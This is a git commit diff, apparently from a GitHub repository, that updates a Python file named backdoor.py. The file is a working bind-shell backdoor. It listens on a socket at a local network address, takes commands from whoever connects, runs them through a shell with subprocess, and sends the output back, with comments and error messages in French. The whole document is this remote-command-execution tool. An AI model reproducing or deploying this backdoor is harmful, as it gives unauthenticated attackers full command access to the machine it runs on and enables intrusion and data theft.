07f339d75202ea47415f6c66265ec1563e4e6f48
Fournoy <152728394+Fournoy@users.noreply.github.com>
2024-12-15 14:23:10 +0100

    Update backdoor.py more clear data

--- backdoor.py
+++ backdoor.py
@@ -2,27 +2,21 @@ import socket
 import subprocess
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "192.168.1.135"
+host = "192.168.1.122"
 port = 12345
 
 s.bind((host, port))
-
 s.listen()
-
+c, addr = s.accept()
 while True:
-    c, addr = s.accept()
-    print (f"connection from {addr}")
-    c.send(b'Connection succeed')
-    cmd = c.recv(1024).decode('utf-8')
-    if cmd == "stop":
-        c.close()
-    prompt= subprocess.Popen([cmd], shell= True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, text=False)
-    stdout, stderr = prompt.communicate() 
-    if stderr:
-            rsp = stderr
-    elif stdout:
-            rsp = stdout  # Sinon, on envoie stdout
-    else:
-            rsp = b"No output from command" 
-    rsp += b'\n'
-    c.send(rsp) 
+        try:
+                print (f"connection from {addr}")
+                cmd = c.recv(1024).decode('utf-8')
+                if cmd == "stop":
+                    c.close()
+                prompt= subprocess.Popen(cmd, shell= True, stdout=subprocess.PIPE, stderr= subprocess.PIPE)
+                stdout, stderr = prompt.communicate()
+                c.sendall(stdout + stderr)
+        except Exception as e:
+                        print(f"Erreur lors de l'exécution de la commande : {e}")
+                        c.sendall(f"Erreur : {e}".encode())
